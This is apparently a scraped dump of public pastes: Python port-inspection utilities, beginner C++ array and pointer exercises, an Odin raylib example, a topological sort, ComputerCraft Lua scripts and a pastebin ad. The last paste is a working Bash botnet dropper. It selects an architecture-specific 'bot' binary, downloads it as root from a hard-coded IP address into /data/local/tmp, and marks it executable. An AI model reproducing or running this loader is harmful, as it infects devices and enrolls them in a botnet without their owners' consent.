                        pytrends.build_payload(keywords, timeframe=f'today {num_months}-m')  # Max: 240 months
                        # Function to display and handle related data
                        result = display_related_data(pytrends, keywords, num_top_related_topics, num_rising_related_topics)
                        if result == 'return':
                            print(""Returned from the external script. Continue with the main program."")
                        elif result == 'end':
                            print(""Ending the program. Goodbye!"")
                            sys.exit(0)
                    except Exception as e:
                        print(f""Failed to fetch data from Google Trends. Error: {e}"")
                else:
                    print(""\nNo related topics to display.\n"")
            else:
                print(f""\nInvalid number of Rising Related topics. Please enter a number between 0 and {max_rising}.\n"")
        else:
            print(f""\nInvalid number of Top Related topics. Please enter a number between 0 and {max_top}.\n"")
    else:
        print(f""\nInvalid number of months. Please enter a number between 1 and {max_months}.\n"")
except ValueError:
    print(""\nInvalid input. Please enter a valid number.\n"")

# DEBUG
# Ignore warnings for redefining variables from the outer scope.
# pylint: disable=redefined-outer-name

"
YD3PVWeF,portscan,Python253,Python,Friday 5th of April 2024 11:46:24 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: portscan.py
# Version: 1.00
# Author: Jeoi Reqi

""""""
This script provides functionality to scan for ports currently in use on the local system along with associated process details.

Functions:
    - get_ports_in_use(): Retrieves a list of ports currently in use along with associated process details.
    - get_process_name(pid): Retrieves the process name associated with a given process ID (PID).
    - display_ports_in_use(ports_in_use): Displays the list of ports currently in use along with their associated processes and programs.

Features:
    - Uses the 'netstat' command-line utility to retrieve a list of ports in use with process details.
    - Parses the output of 'netstat' to extract port numbers, PIDs, and process names.
    - Utilizes the psutil library to retrieve process names based on PIDs for enhanced process details.
    - Displays the list of ports currently in use with detailed process and program information in a formatted table.

Requirements:
    - Python 3.x
    - psutil library (install via pip: pip install psutil)

Usage:
    1. Ensure Python 3.x is installed on your system.
    2. Install the psutil library by running: pip install psutil
    3. Save the script as 'portscan.py'.
    4. Execute the script using the command: python portscan.py
    5. The script will display the ports currently in use along with associated process details.

Notes:
    - This script relies on the 'netstat' command-line utility to retrieve information about ports in use.
    - It may require elevated privileges to execute certain commands, depending on the system's security settings.
    - The psutil library is used to retrieve process names based on process IDs (PIDs) for enhanced process details.
    - Ensure to review the output carefully, as it may contain sensitive information about processes and network connections.
""""""

import subprocess
import psutil
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to get ports currently in use along with process details
def get_ports_in_use():
    """"""
    Retrieves a list of ports currently in use along with associated process details.

    Returns:
        list: A list of tuples containing port numbers, process IDs (PIDs), and process names.
    """"""
    try:
        # Use netstat command to get list of ports in use with process details
        result = subprocess.run(['netstat', '-a', '-n', '-o', '-p', 'TCP'], capture_output=True, text=True)
        output = result.stdout
        lines = output.split('\n')

        # Parse output to extract ports in use along with process details
        ports_in_use = []
        for line in lines[4:]:
            parts = line.split()
            if len(parts) >= 5:
                local_address = parts[1]
                port = local_address.split(':')[-1]
                pid = parts[-1]
                process_name = parts[-2]
                ports_in_use.append((int(port), int(pid), process_name))
        return ports_in_use
    except Exception as e:
        logging.error(f""Error retrieving ports in use: {e}"")
        return []

# Function to get process name from PID
def get_process_name(pid):
    """"""
    Retrieves the process name associated with a given process ID (PID).

    Args:
        pid (int): The process ID (PID) of the target process.

    Returns:
        str: The name of the process associated with the given PID, or 'N/A' if not found.
    """"""
    try:
        process = psutil.Process(pid)
        return process.name()
    except psutil.NoSuchProcess:
        return ""N/A""
    except Exception as e:
        logging.error(f""Error retrieving process name for PID {pid}: {e}"")
        return ""N/A""

# Display ports in use with process details
def display_ports_in_use(ports_in_use):
    """"""
    Displays the list of ports currently in use along with their associated processes and programs.

    Args:
        ports_in_use (list): A list of tuples containing port numbers, process IDs (PIDs), and process names.
    """"""
    if ports_in_use:
        print(""Ports currently in use:"")
        print(""{:<10} {:<10} {:<20} {:<30}"".format(""Port #"", ""PID"", ""Process"", ""Program""))
        for port, pid, process_name in ports_in_use:
            program_name = get_process_name(pid)
            print(""{:<10} {:<10} {:<20} {:<30}"".format(port, pid, process_name, program_name))
    else:
        print(""No ports currently in use."")

# Get ports currently in use with process details
used_ports = get_ports_in_use()

# Display ports in use with process details
display_ports_in_use(used_ports)
"
vtzG1TAC,Untitled,35657,C++,Friday 5th of April 2024 11:44:51 PM CDT,"#include <iostream> 

using namespace std;



int main() {
    setlocale(LC_ALL, ""ru"");

    int size;

    cout << ""Введите размер массива: "";

    cin >> size;

    int* ptr = new int;

    int* arr = new int[size];
    
    for (int i = 0; i < size; i++) {
        arr[i] = rand() % 100;
        cout << arr[i] << "" "";
    }

    delete ptr;

    delete[] arr; 
}"
m58J6VeB,is_port_open,Python253,Python,Friday 5th of April 2024 11:43:18 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: is_port_open.py
# Version: 1.00
# Author: Jeoi Reqi

""""""
This script enables users to check for open ports and listen on a specific port if desired.

Functions:
    - get_ports_in_use(): Retrieves a dictionary of ports currently in use along with associated process information.
    - list_ports_in_use(ports_in_use): Displays the list of ports in use along with their associated processes.
    - prompt_user_to_save_data(ports_in_use): Prompts the user whether to save the ports in use data to a file named 'inuse.txt'.
    - prompt_user_for_port(): Prompts the user to enter the port number they want to listen on.
    - listen_on_port(selected_port): Listens on the selected port for incoming connections and displays received data.
    - save_selected_port_data(selected_port, ports_in_use): Saves the data associated with the selected port to a file.

Features:
    - Retrieves a list of ports currently in use on the local system along with associated process information.
    - Displays the list of ports in use, providing process details for each port.
    - Allows the user to save the ports in use data to a text file for further analysis.
    - Prompts the user to select a port to listen on, then listens on that port for incoming connections.
    - Saves data related to the selected port to a text file for reference.

Requirements:
    - Python 3.x
    - psutil library (install via pip: pip install psutil)

Usage:
    1. Ensure Python 3.x is installed on your system.
    2. Install the psutil library by running: pip install psutil
    3. Save the script as 'is_port_open.py'.
    4. Execute the script using the command: python is_port_open.py
    5. Follow the prompts to view ports in use, select a port to listen on, and save data if desired.

Notes:
    - This script retrieves information about ports in use and listens for incoming connections on the local system.
    - It may require elevated privileges to gather process information depending on the system's security settings.
    - The 'inuse.txt' file will be created in the same directory as the script if the user chooses to save data.
    - Ensure to review the contents of the saved data files, as they may contain sensitive information.
""""""

import psutil
import socket

# Function to get the list of ports in use
def get_ports_in_use():
    """"""
    Retrieves a dictionary of ports currently in use along with associated process information.

    Returns:
        dict: A dictionary containing port numbers as keys and sets of process information tuples as values.
    """"""
    ports_in_use = {}
    for conn in psutil.net_connections():
        if conn.laddr.port not in ports_in_use:
            ports_in_use[conn.laddr.port] = set()
        if conn.pid is None:
            process = {'pid': -1, 'name': 'UNKNOWN', 'program': 'UNKNOWN'}
        else:
            try:
                cmdline = psutil.Process(conn.pid).cmdline()
                program = ' '.join(cmdline) if cmdline else 'UNKNOWN'
                process = {'pid': conn.pid, 'name': psutil.Process(conn.pid).name(), 'program': program}
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                process = {'pid': conn.pid, 'name': 'UNKNOWN', 'program': 'UNKNOWN'}
        ports_in_use[conn.laddr.port].add((process['pid'], process['name'], process['program']))
    return ports_in_use

# Function to list ports in use
def list_ports_in_use(ports_in_use):
    """"""
    Displays the list of ports in use along with their associated processes.

    Args:
        ports_in_use (dict): A dictionary containing port numbers as keys and sets of process information tuples as values.
    """"""
    for port, processes in sorted(ports_in_use.items()):
        print(""\n"" + ""-"" * 40)
        for process in processes:
            pid, name, program = process
            if name == 'svchost.exe' and program == 'UNKNOWN':
                print(f""\n{name}"")
            else:
                print(f""\n{name}"")
                print(f""Port: {port}, PID: {pid}    {program}"")

# Function to prompt user to save data
def prompt_user_to_save_data(ports_in_use):
    """"""
    Prompts the user whether to save the ports in use data to a file named 'inuse.txt'.

    Args:
        ports_in_use (dict): A dictionary containing port numbers as keys and sets of process information tuples as values.
    """"""
    while True:
        save_data = input(""\nDo you want to save the ports in use data to 'inuse.txt'?\n1: YES\n2: NO\n(Enter your option number): "").strip().lower()
        if save_data == '1':
            with open('inuse.txt', 'w') as file:
                for port, processes in sorted(ports_in_use.items()):  
                    for process in processes:
                        pid, name, program = process
                        file.write(f""\n{name}\n"")
                        file.write(f""Port: {port}, PID: {pid}    {program}\n"")
            print(""Ports in use data saved to 'inuse.txt'."")
            break
        elif save_data == '2':
            break
        else:
            print(""Invalid input. Please enter '1' for YES or '2' for NO."")

# Function to prompt user for port to listen on
def prompt_user_for_port():
    """"""
    Prompts the user to enter the port number they want to listen on.

    Returns:
        int: The port number selected by the user.
    """"""
    while True:
        selected_port = input(""Enter the port number you want to listen on: "")
        try:
            selected_port = int(selected_port)
            if selected_port < 1 or selected_port > 65535:
                raise ValueError(""Invalid port number."")
            return selected_port
        except ValueError:
            print(""Invalid input. Please enter a valid port number."")

# Function to listen on the selected port
def listen_on_port(selected_port):
    """"""
    Listens on the selected port for incoming connections and displays received data.

    Args:
        selected_port (int): The port number to listen on.
    """"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('127.0.0.1', selected_port))
            print(f""Listening on port {selected_port}..."")
            s.listen(1)
            conn, addr = s.accept()
            with conn:
                print('Connected by', addr)
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    print(f""Received data: {data.decode('utf-8')}"")
    except OSError as e:
        print(f""Failed to listen on port {selected_port}: {e}"")

# Function to save data for the selected port
def save_selected_port_data(selected_port, ports_in_use):
    """"""
    Saves the data associated with the selected port to a file.

    Args:
        selected_port (int): The port number selected by the user.
        ports_in_use (dict): A dictionary containing port numbers as keys and sets of process information tuples as values.
    """"""
    try:
        with open(f'port_{selected_port}_data.txt', 'w') as file:
            file.write(f""Port {selected_port}:\n"")
            for process in ports_in_use.get(selected_port, []):
                pid, name, program = process
                file.write(f""PID: {pid}\nProcess: {name}\nProgram: {program}\n\n"")
        print(f""Data for port {selected_port} saved to 'port_{selected_port}_data.txt'."")
    except Exception as e:
        print(f""Failed to save data for port {selected_port}: {e}"")

# Main function
def main():
    """"""
    Main function to execute the script.
    """"""
    # Get ports in use
    ports_in_use = get_ports_in_use()

    # List ports in use
    list_ports_in_use(ports_in_use)

    # Prompt user to save ports in use data
    prompt_user_to_save_data(ports_in_use)

    # Prompt user for port to listen on
    selected_port = prompt_user_for_port()
    print(f""Selected port: {selected_port}"")

    # Save data for the selected port
    save_selected_port_data(selected_port, ports_in_use)

    # Listen on the selected port
    listen_on_port(selected_port)

if __name__ == ""__main__"":
    main()

"
iB3ERdqM,Odin Raylib example portable_window,androth,C,Friday 5th of April 2024 11:42:26 PM CDT,"package raylib_portable_window

import ""core:c/libc""

// conversion of portable_window.c example to odin.
// LICENSE: zlib/libpng

import rl ""vendor:raylib""

main :: proc() {

    screenWidth  : libc.int = 800
    screenHeight : libc.int = 600
    
    rl.SetConfigFlags({.WINDOW_UNDECORATED})
    rl.InitWindow(screenWidth, screenHeight, ""raygui - protable window"")

    mousePosition  : rl.Vector2
    windowPosition : rl.Vector2 = { 500, 200 }
    panOffset := mousePosition
    dragWindow : bool = false

    rl.SetWindowPosition(libc.int(windowPosition.x), libc.int(windowPosition.y))

    exitWindow : libc.int = 0

    rl.SetTargetFPS(60)

    for (exitWindow == 0 && !rl.WindowShouldClose()) {
        
        // Update
        mousePosition = rl.GetMousePosition()

        if(rl.IsMouseButtonPressed(rl.MouseButton.LEFT) && !dragWindow) {
            
            if(rl.CheckCollisionPointRec(mousePosition, rl.Rectangle({0,0, f32(screenWidth), 20}))) {

                dragWindow = true
                panOffset = mousePosition

            }
        }

        if(dragWindow) {
            windowPosition.x += mousePosition.x - panOffset.x
            windowPosition.y += mousePosition.y - panOffset.y

            rl.SetWindowPosition(libc.int(windowPosition.x), libc.int(windowPosition.y))
            if rl.IsMouseButtonReleased((rl.MouseButton.LEFT)) { dragWindow = false }
        }

        // Draw
        rl.BeginDrawing()

            rl.ClearBackground(rl.RAYWHITE)

            exitWindow = rl.GuiWindowBox( rl.Rectangle({0, 0, f32(screenWidth), f32(screenHeight) }), ""#198# PORTABLE WINDOW"")

            // NOTE: made the font sizes bigger than the original C example
            rl.DrawText(rl.TextFormat(""Mouse Position: [ %.0f, %.0f ]"", mousePosition.x, mousePosition.y), 10, 40, 40, rl.DARKGRAY)
            rl.DrawText(rl.TextFormat(""Window Position: [ %.0f, %.0f ]"", windowPosition.x, windowPosition.y), 10,100, 40, rl.DARKGRAY)

        rl.EndDrawing()
    }

    // De-Initialization
    rl.CloseWindow()

}
"
kyPEH521,is_listening,Python253,Python,Friday 5th of April 2024 11:39:14 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: is_listening.py
# Version: 1.00
# Author: Jeoi Reqi

""""""
This script retrieves information about listening ports and their associated processes on a local system.
It utilizes the psutil library to gather network connection data and process information.

Functions:
    - get_listening_ports(): Retrieves information about listening ports and their associated processes.
    
Features:
    - Retrieves listening ports and their associated process information (PID, user, command, start time, memory usage, CPU usage).
    - Handles cases where process information cannot be retrieved due to permissions or non-existent processes.
    - Groups the retrieved data with a space between each group for better readability.
    - Prompts the user whether to save the data to a file named 'listening_ports.txt'.
    - Provides error handling for file writing operations.

Requirements:
    - Python 3.x
    - psutil library (install via pip: pip install psutil)

Usage:
    1. Ensure Python 3.x is installed on your system.
    2. Install the psutil library by running: pip install psutil
    3. Save the script as 'is_listening.py'.
    4. Execute the script using the command: python is_listening.py
    5. Follow the prompts to view the listening ports and optionally save the data to a file.

Notes:
    - This script retrieves information about listening ports and associated processes on the local system only.
    - It may require elevated privileges to gather process information depending on the system's security settings.
    - The 'listening_ports.txt' file will be created in the same directory as the script.
    - Ensure to review the contents of the 'listening_ports.txt' file, as it may contain sensitive information.

""""""

import psutil

# Define a function to get the list of listening ports with additional process information
def get_listening_ports():
    # Get all connections
    connections = psutil.net_connections(kind='inet')
    listening_ports = []
    grouped_data = []

    # Iterate over the connections
    for conn in connections:
        # Check if the connection is listening
        if conn.status == 'LISTEN':
            # Extract port number and process ID (PID)
            port = conn.laddr.port
            pid = conn.pid

            # Fetch process information
            try:
                process = psutil.Process(pid)
                user = process.username()
                command = process.cmdline()
                start_time = process.create_time()
                memory_percent = process.memory_percent()
                cpu_percent = process.cpu_percent()

                # Append the collected information to the list
                listening_ports.append(
                    f""Port: {port}\nPID: {pid}\nUser: {user}\nCommand: {command}\nStart Time: {start_time}\nMemory Usage: {memory_percent}%\nCPU Usage: {cpu_percent}%\n"")
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # If process information cannot be retrieved, append N/A
                listening_ports.append(
                    f""Port: {port}\nPID: {pid}\nUser: N/A\nCommand: N/A\nStart Time: N/A\nMemory Usage: N/A\nCPU Usage: N/A\n"")

    # Group the data with a space between each group
    for i in range(0, len(listening_ports), 2):
        grouped_data.append('\n'.join(listening_ports[i:i+2]))

    # Print the grouped data
    print('\n\n'.join(grouped_data))

    # Prompt the user whether to save the data to a file
    save_to_file = input(""\nDo you want to save the data to 'listening_ports.txt'?\nOPTIONS:\n1: YES\n2: NO\nMake Your Selection (1 or 2): "").strip().lower()
    if save_to_file == '1':
        try:
            with open('listening_ports.txt', 'w') as file:
                file.write('\n\n'.join(grouped_data))
            print(""Data saved to 'listening_ports.txt'."")
        except Exception as e:
            print(f""Failed to save data: {e}"")
    elif save_to_file == '2':
        print(""Data not saved."")
    else:
        print(""Invalid input. Data not saved."")

# Call the function to print the listening ports and prompt the user to save the data to a file
get_listening_ports()

"
tgjSHNd9,pastebin.ai  [Pastebin Alternative],xxsa,PHP,Friday 5th of April 2024 11:39:03 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.x
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.."
NAJ6sYz8,Untitled,35657,C++,Friday 5th of April 2024 11:11:45 PM CDT,"#include <iostream> 

using namespace std;

void Swap1(int* a, int* b) {
    int temp = *a;
    *a = *b;
    *b = temp;
}

void Swap2(int& a, int& b) {
    int temp = a;
    a = b;
    b = temp;
}

int main() {
    setlocale(LC_ALL, ""ru"");

    int a = 5, b = 10;

    cout << a << "" "" << b << endl;
    Swap1(&a, &b);
    cout << a << "" "" << b << endl;
    Swap2(a, b);
    cout << a << "" "" << b << endl;
}"
FztwWzw7,Untitled,35657,C++,Friday 5th of April 2024 10:51:29 PM CDT,"#include <iostream> 

using namespace std;

int sum(int x, int y) {
    return x + y;
}

// x передается в функцию по значению, все действия выполняются с копией
int square(int x) { 
    return x *= x;
}

// передаем аргументы в функцию по указатели, все действия производим с оригиналом переменной
void square2(int* x) {
    *x *= *x;
}

// передаем аргументы в функцию по ссылке, все действия проихводим с оригиналом переменной
void square3(int& x) {
    x *= x;
}

int main() {
    setlocale(LC_ALL, ""ru"");

    int a = 5;

    cout << square(a) << endl;

    cout << a << endl;

    square2(&a);

    cout << a << endl;

    int& x_ref = a;

    cout << x_ref << endl;

    square3(a);

    cout << a << endl;
}"
0M8zwhqW,Topological sort,nathanwailes,Python,Friday 5th of April 2024 10:47:39 PM CDT,"""""""
Topological sorting for a directed graph is a linear ordering of its vertices such that for every directed edge UV from vertex U to vertex V, U comes before V in the ordering. Topological Sorting is possible if and only if the graph has no directed cycles, that is, if it is a Directed Acyclic Graph (DAG).

One common way to perform a topological sort is to use Kahn's Algorithm, which involves iteratively removing nodes with no incoming edges and removing their outgoing edges from the graph.
""""""
from collections import deque

def topological_sort(graph):
    # Calculate in-degree (number of incoming edges) for each node
    in_degree = {u: 0 for u in graph}  # Initialize in-degree as 0 for all vertices
    for u in graph:
        for v in graph[u]:
            in_degree[v] += 1

    # Queue for all nodes with no incoming edge
    queue = deque([u for u in graph if in_degree[u] == 0])
    
    top_order = []  # List to store the topological order

    while queue:
        u = queue.popleft()  # Choose the vertex with no incoming edges
        top_order.append(u)

        # Decrease in-degree by 1 for all its neighboring nodes
        for v in graph[u]:
            in_degree[v] -= 1
            # If in-degree becomes zero, add it to the queue
            if in_degree[v] == 0:
                queue.append(v)

    # Check if there was a cycle
    if len(top_order) != len(graph):
        return ""The graph has at least one cycle and cannot be topologically sorted.""
    else:
        return top_order

# Example usage
graph = {
    'A': ['B', 'C'],
    'B': ['D', 'E'],
    'C': ['F'],
    'D': [],
    'E': ['F'],
    'F': []
}

print(topological_sort(graph))
# Output: ['A', 'B', 'C', 'D', 'E', 'F'] or any other order that satisfies the topological order conditions"
BsCNWHDN,MOUSE_DIMENSION.cpp,imk0tter,C++,Friday 5th of April 2024 10:26:15 PM CDT,"#include ""MOUSE_DIMENSION.h""

float MOUSE_DIMENSION::RESOLUTION_AND_FOV_TO_RADIUS(float RESOLUTION, float FOV)
{
    //TODO: return RADIUS from FOV in PIXELS instead of DEGREES
    return (RESOLUTION / sin(MOUSE_PI / (360 / FOV))) / 2;
}

MOUSE_DIMENSION::MOUSE_DIMENSION(float RESOLUTION = 800, float FOV = 90, float SENSITIVITY = 1, unsigned long long CALLS_PER_INSTANCE = 1, unsigned long long INSTANCES_PER_LOSS = 360000, int MAXIMUM_SENSITIVTY = 10, int INCREMENTS_PER_UNIT_OF_SENSITIVITY = 5)
{
    this->m_RESOLUTION = RESOLUTION;

    this->m_RADIUS = this->RESOLUTION_AND_FOV_TO_RADIUS(RESOLUTION, FOV);
    this->m_CIRCUMFERENCE = this->m_RADIUS * MOUSE_PI * 2;

    this->m_FOV = FOV;
    this->m_SENSITIVITY = SENSITIVITY;

    this->m_CALLS_PER_INSTANCE = CALLS_PER_INSTANCE;
    this->m_INSTANCES_PER_LOSS = INSTANCES_PER_LOSS;

    //INFLATION_FACTOR = (CPI * INSTANCES) * MOUSE_INFLATION_FACTOR
    this->m_INFLATION_FACTOR = m_CALLS_PER_INSTANCE * m_INSTANCES_PER_LOSS * MOUSE_PI * 2;

    //CIRCUMFERENCE = GET_RADIUS_FROM_RESOLUTION_AND_FOV(RESOLUTION, FOV) * PI * 2 * INFLATION_FACTOR
    this->m_TOTAL_ANGLE = 0;
}
void MOUSE_DIMENSION::UPDATE_RESOLUTION(float RESOLUTION)
{
    m_TOTAL_ANGLE = (m_TOTAL_ANGLE / (m_RESOLUTION / (m_RESOLUTION = RESOLUTION)));
    m_RADIUS = this->RESOLUTION_AND_FOV_TO_RADIUS(RESOLUTION, this->m_FOV);
    m_CIRCUMFERENCE = m_RADIUS * MOUSE_PI * 2;

}
void MOUSE_DIMENSION::UPDATE_FOV(float FOV)
{
    m_RADIUS = this->RESOLUTION_AND_FOV_TO_RADIUS(m_RESOLUTION, m_FOV);
    m_CIRCUMFERENCE = m_RADIUS * MOUSE_PI * 2;
    //TODO: UPDATE CIRCUMFERENCE, INFLATION_FACTOR, and TOTAL_ANGLE
}
void MOUSE_DIMENSION::UPDATE_SENSITIVITY(float SENSITIVITY)
{
    this->m_SENSITIVITY = SENSITIVITY;
}
float ABSN(float INPUT)
{
    return sqrt(INPUT * INPUT);
}
float ATANN(float INPUT) 
{
    return INPUT / ABSN(INPUT);
}
inline float MODULO(float x, float y)
{
    return fmod(x, y);
}
inline float INTEGERIZE(float input)
{
    return input - MODULO(input, 1);
}
inline float CLAMP(float rotations_in_n_units, float half_n_unit)
{
    return MODULO(INTEGERIZE(rotations_in_n_units / half_n_unit), 2) * -1 * half_n_unit + MODULO(rotations_in_n_units, half_n_unit);
}
float TRANSDUCE(float INPUT, float SENSITIVITY) 
{
    return ATANN(INPUT) * 2 * asinf(ABSN(CLAMP(INPUT * SENSITIVITY, 2)) / 2);
}
float FORMAT_INPUT(float INPUT, float SENSITIVITY)
{
    return TRANSDUCE(INPUT, SENSITIVITY);
}
long MOUSE_DIMENSION::INPUT(float INPUT)
{
    long TOTAL_ANGLE = this->m_TOTAL_ANGLE;
    m_TOTAL_ANGLE = static_cast<long long>(fmod(m_TOTAL_ANGLE + (this->m_RADIUS * this->m_INFLATION_FACTOR * FORMAT_INPUT(INPUT, this->m_SENSITIVITY)),m_CIRCUMFERENCE * m_INFLATION_FACTOR));

    std::cout << ""m_RESOLUTION: "" << m_RESOLUTION << "", m_INFLATION_FACTOR: "" << m_INFLATION_FACTOR << "", NEW_TOTAL: "" << TOTAL_ANGLE << ""\n"";

    return static_cast<long long>(TOTAL_ANGLE / m_INFLATION_FACTOR);
}"
cvn5zTVE,Untitled,35657,C++,Friday 5th of April 2024 10:17:51 PM CDT,"#include <iostream> 


using namespace std;


void print(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        cout << *(arr + i) << "" "";
    }
    cout << endl;
}

void init(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        *(arr + i) = rand() % 100;
    }
}

void sort(int arr[], int size) {
    int temp;
    for (int k = 0; k < size; k++) {
        for (int j = 0; j < size - k - 1; j++) {
            if (arr[j] > arr[j + 1]) {
                temp = arr[j];
                arr[j] = arr[j + 1];
                arr[j + 1] = temp;
            }
        }
    }
}

void merge(int* arr1, int size1, int* arr2, int size2, int* arr3, int size3) {

    int i1 = 0, i2 = 0;

    for (int i = 0; i < size3; i++) {
        if (i1 == size1) {
            for (int j = i; j < size3; j++) {
                *(arr3 + j) = *(arr2 + i2);
                i2++;
            }
            return;
        }

        if (i2 == size2) {
            for (int j = i; j < size3; j++) {
                *(arr3 + j) = *(arr1 + i1);
                i1++;
            }
            return;
        }

        if (*(arr1 + i1) > *(arr2 + i2)) {
            *(arr3 + i) = *(arr2 + i2);
            i2++;
        }
        else {
            *(arr3 + i) = *(arr1 + i1);
            i1++;
        }
    }

}


int main() {
    setlocale(LC_ALL, ""ru"");

    srand(time(NULL));

    const int size1 = 15, size2 = 18;

    int arr1[size1];
    int arr2[size2];

    init(arr1, size1);
    sort(arr1, size1);
    print(arr1, size1);

    init(arr2, size2);
    sort(arr2, size2);
    print(arr2, size2);

    const int size3 = size1 + size2;
    int arr3[size3];

    merge(arr1, size1, arr2, size2, arr3, size3);

    print(arr3, size3);
}"
umPBYS1P,Untitled,35657,C++,Friday 5th of April 2024 10:07:27 PM CDT,"#include <iostream>

using namespace std;

void print(int arr[], int size) {
	for (int i = 0; i < size; i++) {
		cout << arr[i] << "" "";
	}
	cout << endl;
}

void init(int arr[], int size) {
	for (int i = 0; i < size; i++) {
		arr[i] = rand() % 100;
	}
}

int find_min_sum_position(int arr[], int size, int start = 0, int min_sum = INT_MAX, int min_index = 0) {
	if (start > size - 10) {
		return min_index;
	}
	int current_sum = 0;
	for (int i = start; i < start + 10; i++) {
		current_sum += arr[i];
	}
	if (current_sum < min_sum) {
		min_sum = current_sum;
		min_index = start;
	}
	return find_min_sum_position(arr, size, start + 1, min_sum, min_index);
}

int main() {

	setlocale(LC_ALL, ""ru"");
	
	srand(time(NULL));

	const int size = 100;

	int arr[size];

	init(arr, size);

	print(arr, size);

	cout << endl;

	cout << find_min_sum_position(arr, size);
}
												"
es3xnZdC,wipe.lua,opencomputerstest2,Lua,Friday 5th of April 2024 09:08:54 PM CDT,"while true do
	local e = {os.pullEvent(""disk"")}
	local drive = peripheral.wrap(e[2])
    if drive.hasData() then
        local mountPath = drive.getMountPath()
		fs.delete(mountPath)
        drive.setLabel(nil)
    end
end
    
"
CCwjQMZH,aDaisyFarm,NortWind,Lua,Friday 5th of April 2024 07:43:38 PM CDT,"--{program=""aDaisyFarm"",version=""1.00"",date=""2024-05-27""}
-- Pastebin ""CCwjQMZH""

local cVer = ""1.00""
local cSlotStone =  1
local cSlotChest = 16

-- wait for enter to be pressed
local function waitEnter(prompt)
  write(prompt)
  read() 
end

local function aboutFace()
    turtle.turnLeft()
    turtle.turnLeft()
end

--------------------------------------
---- put stone into slot 1 -----------
--------------------------------------
local function repackInventory()
    -- store away stuff
    turtle.select(cSlotChest) 
    while not turtle.placeUp()         -- put chest on top of turtle
    do 
        print(""Failed to place chest."")
        os.sleep(1) 
    end  
    for i = 2, 15 do                   -- leave stone in cSlotStone
        turtle.select(i)
        turtle.dropUp()                -- put entire stack from slot into chest
    end
    turtle.select(cSlotStone)          -- replace contents
    while turtle.suckUp() do end       -- take all from chest
    turtle.select(cSlotChest)          -- retrieve the chest
    turtle.digUp() 
    turtle.select(cSlotStone)
end

-- empty slot gets a stone
local function placeStone()
    turtle.select(cSlotStone) 
    if not turtle.detect() and turtle.getItemCount(cSlotStone) > 1
    then
        turtle.place()
    end
end

-- take care of one corner, two blocks.
local function oneCorner()
    turtle.dig()
    turtle.forward()         -- move onto corner
    aboutFace()
    placeStone()           -- place mid square
    turtle.turnLeft()
    turtle.dig()
    turtle.forward()         -- move to mid square
    aboutFace()
    placeStone()           -- place in corner
    aboutFace()
end

-- move to next daisy
local function oneRun()
    turtle.dig()
    turtle.forward()         -- move onto corner
    aboutFace()
    placeStone()           -- place mid square
    aboutFace()
    turtle.dig()
    turtle.forward()         -- move onto next daisy corner
    aboutFace()
    -- placeStone()
    aboutFace()
    turtle.dig()
    turtle.forward()         -- move onto next daisy mid
    
end

-- do 8 sites of the 32 sites along the cloverleaf path
local function oneQuarter()
    oneCorner()
    oneCorner()
    oneRun()
    oneCorner()
end

-- harvest without restock
local function cleanUp()
    for i = 1, 5                       -- may be a partial that needs to be cleaned.
    do
        oneQuarter()
    end
end

-- run loop until stone is used up
local function processAll()
    turtle.turnLeft()                 -- face initial direction

    while turtle.getItemCount(cSlotStone) > 8
    do
        while turtle.getItemCount(cSlotStone) >= 8  -- 
        do
            oneQuarter()
        end
        if turtle.getItemCount(cSlotStone) < 8
        then
            repackInventory()          -- move more stones into cSlotStone
        end
    end
    cleanUp()
end

--------------------------------------
---- aLivingStone --------------------
--------------------------------------
turtle.select(cSlotStone)
print(""+-------------------------------------+"")
print(""| aLivingStone ""..cVer.."", by NortWind      |"")
print(""+-------------------------------------+"")
print(""|   slot    1: stone     (2 to 64)    |"")
print(""|   slot 2-14: stone     (0 to 64)    |"")
print(""|   slot   15: empty                  |"")
print(""|   slot   16: chest      1           |"")
print(""| Set-up: Place turtle one square     |"")
print(""|   from pure daisy, facing daisy.    |"")
print(""|   Logs will work as well as stone.  |"")
print(""+-------------------------------------+"")
waitEnter(""Press enter for layout:"")

print(""+-------------------------------------+"")
print(""|   ######                            |"")
print(""|   #P##P#     P = Pure Daisy         |"")
print(""|   ######                            |"")
print(""|   ######                            |"")
print(""|   #P##P#     # = conversion site    |"")
print(""|   #T####     T = Mining Turtle      |"")
print(""+-------------------------------------+"")
waitEnter(""Press enter to start:"")

if turtle.getItemCount(1)<2 or turtle.getItemCount(15)~=0 or turtle.getItemCount(16)~=1 
then
    print(""Inventory is not correct."")
elseif turtle.getFuelLevel() < 10000 then
    print(""Fuel level is too low."")
else    
    processAll()
end

"
LgsHmriG,analyzing,rexioderum,Bash,Friday 5th of April 2024 07:25:27 PM CDT,"#!/bin/bash

# Xác định CPU của thiết bị
cpu_arch=$(uname -m)

# Chuyển đổi kiến trúc CPU thành tên tệp tin phù hợp
case ""$cpu_arch"" in
  ""armv7l"" | ""armv8l"")
    file_name=""bot.arm7""
    ;;
  ""aarch64"")
    file_name=""bot.x86""
    ;;
  ""x86_64"")
    file_name=""bot.x86_64""
    ;;
  *)
    echo ""Kiến trúc CPU không được hỗ trợ: $cpu_arch""
    exit 1
    ;;
esac

# Tải tệp tin từ URL phù hợp với CPU
download_url=""http://103.188.244.189/$file_name""
su 0 busybox wget ""$download_url"" -O /data/local/tmp/""$file_name""
su 0 chmod +x /data/local/tmp/$file_name
